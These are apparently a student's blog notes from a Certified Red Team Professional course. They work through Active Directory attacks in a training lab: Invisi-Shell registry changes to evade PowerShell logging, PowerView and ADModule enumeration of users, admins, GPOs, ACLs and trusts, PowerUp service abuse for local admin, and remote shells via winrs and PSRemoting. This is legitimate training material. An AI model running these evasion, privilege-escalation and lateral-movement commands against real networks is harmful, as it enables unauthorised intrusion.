---
title: Certified Red Team Professional Notes
date: 2023-03-7 15:23
categories: [notes]
tags: [Windows, Active Directory]
--- 

# Certified Red Team Professional Notes

## Week 1

•  Enumerate useful information like users, groups, group memberships,
computers, user properties, trusts, ACLs etc. to map attack paths!

• Learn and practice different local privilege escalation techniques on a Windows machine.

• Hunt for local admin privileges on machines in the target domain using multiple methods.

• Abuse enterprise applications to execute complex attack paths that involve bypassing antivirus and pivoting to different machines.

### Learning Objective 1

Enumerating Users, Computers, Domain Admins, and Enterprise Admins.

#### Using PowerView

Start a PowerShell session using Invisi-Shell to avoid enhanced logging. (\AD\Tools\InvisiShell\RunWithRegistryNonAdmin.bat)

```powershell
C:\Users\studentx>cd \AD\Tools
C:\AD\Tools>C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
C:\AD\Tools>set COR_ENABLE_PROFILING=1
C:\AD\Tools>set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
C:\AD\Tools>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
The operation completed successfully.
C:\AD\Tools>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-
b283c03916db}\InprocServer32" /f
The operation completed successfully.
C:\AD\Tools>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d
"C:\AD\Tools\InviShell\InShellProf.dll" /f
The operation completed successfully.
C:\AD\Tools>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
```

Load Powerview in the PowerShell Session

```powershell
. C:\Ad\Tools\PowerView.ps1
```
To see users in the domain, 

`Get-DomainUser` 

and to get only a specific property of all users, use the select-object cmdlet as such.

```powershell
Get-DomainUser | select -ExpandProperty samaccountname
```

To see domain computer objects

```powershell
Get-DomainComputer | select -ExpandProperty dnshostname
```

to see details of the DA group, can get SIDs, Membernames

```powershell
Get-DomainGroup -Identity "Domain Admins"
```

To enumerate members of the EA group

```powershell
Get-DomainGroupMember -Identity "Enterprise Admins"
```

If you are not in the root domain, this command will not work. You need to query the root domain as EA group is only present in the root of the forest.

```powershell
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local
```

#### Using ADModule

In a different invisishell session, import the ADModule with

```powershell
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll

and 

Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

Then you can begin user enumeration with 

```Powershell
Get-ADUser -Filter *
```

Use the -Properties paramter to filter by the properties you want to see, for example

```Powershell
Get-ADUser -Filter * -Properties * | select Samaccountname,Description
```

To list computers

```Powershell
Get-ADComputer -Filter *
```

Enumerate Domain Administrators with

```powershell
Get-ADGroupMember -Identity 'Domain Admins'
```

Enumerate Enterprise Admins with

```powershell
Get-ADGroupMember -Identity 'Enterprise Admins' -Server moneycorp.local
```

### Learning Objective 2

Enumerate OUs, list all computers in the StudentMachines OU, List the GPOs, Enumerate GPO applied on the StudentMachines OU.

#### PowerView

To list all OUs

```powershell
Get-DomainOU
```

To only see the names of OUs

```powershell
Get-DomainOU | select -ExpandProperty name
```

Listing all computers in the StudentMachines OU more complicated

```powershell
(Get-DomainOU -Identity StudentMachines).distinguishedname |  %{Get-DomainComputer -SearchBase $_} | select name
```

To get GPOs

```powershell
Get-DomainGPO
```

To Enumerate GPO applied on the StudentMachines OU, you need to copy part of the gplink attribute from the output of the command below:

```powershell
(Get-DomainOU -Identity StudentMachines).gplink
```

The part you need to copy will look like 

`{7478F170-6A0C-490C-B355-
9E4618BC785D}`

Then, to see GPO applied to StudentMachines, use

```powershell
Get-DomainGPO -Identity '{7478F170-6A0C-490C-B355-
9E4618BC785D}'
```

With powershell magic, you can do this all in one command:

```powershell
Get-DomainGPO -Identity (Get-DomainOU -Identity StudentMachines).gplink.substring(11, (Get-DomainOU -Identity StudentMachines).gplink.length-72)
```

### Learning Objective 3

Enumerate ACL for DA group, and view modify rights and permissions for students.

#### Using PowerView

To enumerate ACLs in the Domain Admins Group

```powershell
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDS -Verbose
```

To check for modify rights/permissions, use `Find-InterestingDomainACL` from powerview as such

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<student name>"}
```

To see permissions for the RDP group 

```powershell
Find-InterestingDomainAcl -ResolveGUIDs |
?{$_.IdentityReferenceName -match "RDPUsers"}
```

### Learning Objective 4

#### Using Powerview

To enumerate all domains in the current forest

```powershell
Get-ForestDomain -Verbose
```

To map all the trusts of the domain 

```powershell
Get-DomainTrust
```

To list only the external trusts in the moneycorp.local forest

```powershell
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} |
?{$_.TrustAttributes -eq "FILTER_SIDS"}
```

To identiy external trusts of the dollarcorp domain, we can use the below command.

```powershell
Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```

Since we have Bidirectional trust between these 2 forests, we can extract information from the eurocorp.local forest. You need either bi-directional or one-way trust from the eurocorp.local to dollarcorp to be able to use the below command.

```powershell
Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -
Domain $_.Name}
```

### Learning Objective 5

In this learning objective we will exploit a service on our machine to elevate privileges to local admin. Then Identiy a machine on the domain where we have local admin access. Also we use privileges of a user on jenkins on a host to get admin privileges on the dcorp-ci server.

We begin by loading powerview after bypassing amsi. 

```powershell
. C:\AD\Tools\PowerUp.ps1
Invoke-AllChecks
```

We can use the abuse-function (`Invoke-ServiceAbuse`) and add our current domain user to the local Administrators group.

```powershell
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp/student502' -Verbose
```

Logging in and out shows we have local administrator privileges.

For the next task, we will identify a machine in the domain where we have local admin using the Find-PSRemotingLocalAdminAccess.ps1

```powershell
C:\AD\Tools>C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
[snip]
PS C:\AD\Tools> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
PS C:\AD\Tools> Find-PSRemotingLocalAdminAccess
```

We have admin access on dcorp-adminsrv and on the student machine, we can connect to dcorp-adminsrv using winrs as the student user with

```powershell
winrs -r:dcorp-adminsrv cmd
```

Or you can do it with PowerShell Remoting

```powershell
PS C:\AD\Tools> Enter-PSSession -ComputerName dcorpadminsrv.dollarcorp.moneycorp.local
PS C:\AD\Tools> [dcorpadminsrv.dollarcorp.moneycorp.local]C:\Users\studentx\Documents> whoami
dcorp\studentx
```

### Learning Objective 6

This learning objective focuses on setting up `BloodHound` to identify the shortest path to Domain Admins in the domain. BLoodhound uses neo4j graph database, so that needs to be set up first.

Install and start the neo4j service as follows:

```powershell
C:\AD\Tools\neo4j-community-4.4.5-windows\neo4j-community4.4.5\bin>neo4j.bat install-service
Neo4j service installed
C:\AD\Tools\neo4j-community-4.4.5-windows\neo4j-community4.4.5\bin>neo4j.bat start
```
